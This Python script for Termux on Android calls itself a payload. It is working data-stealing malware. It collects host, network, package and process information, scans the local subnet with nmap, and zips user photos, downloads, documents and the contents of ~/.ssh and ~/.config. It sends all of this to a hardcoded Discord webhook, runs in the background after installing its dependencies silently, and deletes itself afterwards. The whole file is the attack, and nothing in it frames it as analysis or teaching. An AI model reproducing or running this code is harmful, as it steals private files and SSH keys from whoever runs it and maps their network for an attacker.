#!/usr/bin/env python3
import os, sys, json, subprocess, time, shutil, glob, socket, threading, platform
from pathlib import Path

# ============================================================
# CONFIGURATION - DISCORD WEBHOOK (HARDCODED)
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"
# ============================================================

# ---- FIX: Use Termux writable temp directory ----
PREFIX = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
TMP_DIR = os.path.join(PREFIX, 'tmp', f'payload_{os.getpid()}')
os.makedirs(TMP_DIR, exist_ok=True)

def log(msg):
    with open(os.path.join(TMP_DIR, "debug.log"), "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")

def send_discord(content=None, file_path=None):
    try:
        import requests
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                requests.post(WEBHOOK_URL, files=files, timeout=10)
        elif content:
            data = {"content": content[:2000]}
            requests.post(WEBHOOK_URL, json=data, timeout=10)
    except Exception as e:
        log(f"send_discord error: {e}")

def run_cmd(cmd, capture=True):
    try:
        if capture:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return r.stdout + r.stderr
        else:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            return ""
    except:
        return ""

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "user": os.getenv("USER"),
        "cwd": os.getcwd(),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ip": run_cmd("curl -s http://api.ipify.org || echo 'N/A'").strip(),
        "os": f"{platform.system()} {platform.release()}",
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": os.cpu_count(),
    }
    return info

def get_network_info():
    info = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "N/A"
    try:
        import netifaces
        info["interfaces"] = {}
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            info["interfaces"][iface] = {
                "ipv4": addrs.get(netifaces.AF_INET, [{}])[0].get("addr", "N/A"),
                "mac": addrs.get(netifaces.AF_LINK, [{}])[0].get("addr", "N/A"),
            }
    except:
        info["interfaces"] = "netifaces not installed"
    return info

def nmap_scan(target="192.168.1.0/24", ports="22,80,443,8080"):
    results = {"target": target, "ports": ports, "hosts": []}
    try:
        import nmap
        nm = nmap.PortScanner()
        log(f"Starting nmap scan: {target} - ports {ports}")
        scan_result = nm.scan(hosts=target, ports=ports, arguments="-sV -T4")
        for host in nm.all_hosts():
            host_info = {
                "host": host,
                "hostname": nm[host].hostname(),
                "state": nm[host].state(),
                "protocols": {}
            }
            for proto in nm[host].all_protocols():
                ports_info = {}
                for port in nm[host][proto].keys():
                    ports_info[port] = {
                        "state": nm[host][proto][port]["state"],
                        "service": nm[host][proto][port].get("name", "unknown"),
                        "product": nm[host][proto][port].get("product", ""),
                        "version": nm[host][proto][port].get("version", ""),
                    }
                host_info["protocols"][proto] = ports_info
            results["hosts"].append(host_info)
        log(f"nmap scan complete: {len(results['hosts'])} hosts found")
    except ImportError:
        log("nmap module not installed - skipping scan")
        results["error"] = "nmap module not installed"
    except Exception as e:
        log(f"nmap scan error: {e}")
        results["error"] = str(e)
    return results

def collect_files():
    files = []
    targets = [
        "/sdcard/DCIM",
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Pictures",
        "/sdcard/Music",
        "/sdcard/Movies",
        os.path.expanduser("~/storage/shared"),
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.termux"),
        os.path.expanduser("~/.config"),
    ]
    for target in targets:
        if os.path.exists(target):
            for root, dirs, _ in os.walk(target):
                if any(skip in root for skip in ["cache", ".thumbnails", "Android/data", "__pycache__"]):
                    continue
                for f in glob.glob(f"{root}/*"):
                    try:
                        if os.path.isfile(f) and os.path.getsize(f) < 5*1024*1024:
                            files.append(f)
                            if len(files) >= 100:
                                return files
                    except:
                        pass
    return files

def get_installed_packages():
    packages = {}
    try:
        pip_list = run_cmd("pip list --format=json")
        try:
            import json
            packages["pip"] = json.loads(pip_list)
        except:
            packages["pip"] = pip_list[:1000]
    except:
        packages["pip"] = "N/A"
    try:
        pkg_list = run_cmd("pkg list-installed 2>/dev/null | head -100")
        packages["termux"] = pkg_list
    except:
        packages["termux"] = "N/A"
    return packages

def get_processes():
    try:
        if platform.system() == "Linux":
            return run_cmd("ps aux | head -50")
        else:
            return run_cmd("tasklist 2>/dev/null | head -50")
    except:
        return "N/A"

def run_background(targets=None):
    try:
        log("Payload started in background")
        info = get_system_info()
        send_discord(f"**System Info**\n```json\n{json.dumps(info, indent=2)}\n```")
        net_info = get_network_info()
        send_discord(f"**Network Info**\n```json\n{json.dumps(net_info, indent=2)}\n```")
        if targets:
            scan_results = nmap_scan(targets)
            send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
        else:
            try:
                local_ip = socket.gethostbyname(socket.gethostname())
                if local_ip.startswith(("192.168.", "10.", "172.")):
                    base = ".".join(local_ip.split(".")[:3]) + ".0/24"
                    scan_results = nmap_scan(base)
                    send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
            except:
                pass
        packages = get_installed_packages()
        send_discord(f"**Installed Packages**\n```json\n{json.dumps(packages, indent=2)[:1900]}\n```")
        procs = get_processes()
        send_discord(f"**Running Processes**\n```\n{procs[:1500]}\n```")
        files = collect_files()
        if files:
            zip_path = os.path.join(TMP_DIR, "files.zip")
            try:
                import zipfile
                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                    for f in files[:50]:
                        try:
                            zf.write(f, os.path.basename(f))
                        except:
                            pass
                if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                    send_discord(f"📁 Files ({len(files)} files, max 50 in zip)", zip_path)
            except Exception as e:
                log(f"Zip error: {e}")
        log("Payload completed")
        try:
            shutil.rmtree(TMP_DIR, ignore_errors=True)
            os.remove(__file__)
        except:
            pass
    except Exception as e:
        log(f"Fatal error: {e}")

def main():
    # Auto‑install dependencies if missing
    try:
        import requests, nmap, netifaces
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "python-nmap", "netifaces"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Use multiprocessing so the payload continues after main exits
    from multiprocessing import Process
    target = sys.argv[1] if len(sys.argv) > 1 else None
    p = Process(target=run_background, args=(target,))
    p.start()
    sys.exit(0)

if __name__ == "__main__":
    main()
